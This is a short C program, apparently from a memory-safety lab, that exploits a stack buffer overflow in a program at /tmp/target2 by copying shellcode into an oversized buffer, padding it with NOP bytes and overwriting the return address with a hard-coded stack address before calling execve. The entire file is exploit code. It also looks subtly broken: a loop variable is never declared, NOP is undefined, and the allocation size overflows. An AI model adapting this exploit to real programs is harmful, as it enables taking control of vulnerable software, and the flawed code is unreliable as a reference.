#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

#define BSIZE 							2147483647 + 10
#define BUFSIZE 						240
#define SFP_SIZE 						4
#define RET_SIZE 						4


int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  args[2] = NULL;
  env[0] = NULL;


	char *buff;
	if (!(buff = malloc(BSIZE))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}
	
	for (i = 0; i < strlen(shellcode); i++)
    		buff[i] = shellcode[i];

	buff[BUFSIZE] = NOP;
	buff[BUFSIZE+1] = NOP;
	buff[BUFSIZE+2] = NOP;
	buff[BUFSIZE+3] = NOP;

	// ret
	buff[BUFSIZE+4] = 0x68;
	buff[BUFSIZE+5] = 0xfd;
	buff[BUFSIZE+6] = 0xff;
	buff[BUFSIZE+7] = 0xbf;

  args[1] = buff;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
